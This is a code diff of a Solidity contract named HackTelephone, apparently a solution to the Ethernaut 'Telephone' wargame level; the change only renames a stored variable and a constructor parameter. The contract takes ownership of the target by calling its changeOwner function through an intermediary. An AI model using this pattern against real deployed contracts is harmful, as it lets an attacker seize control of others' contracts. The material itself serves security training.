@@ -6,14 +6,14 @@ import "../ethernaut/Telephone.sol";
 contract HackTelephone {
     address public owner;
     Telephone private _telephoneContract;
-    address public _desiredOwner;
+    address public desiredOwner;
 
-    constructor(address telephoneContract, address desiredOwner) {
+    constructor(address telephoneContract, address _desiredOwner) {
         _telephoneContract = Telephone(telephoneContract);
-        _desiredOwner = desiredOwner;
+        desiredOwner = _desiredOwner;
     }
 
     function attack() public {
-        _telephoneContract.changeOwner(_desiredOwner);
+        _telephoneContract.changeOwner(desiredOwner);
     }
 }
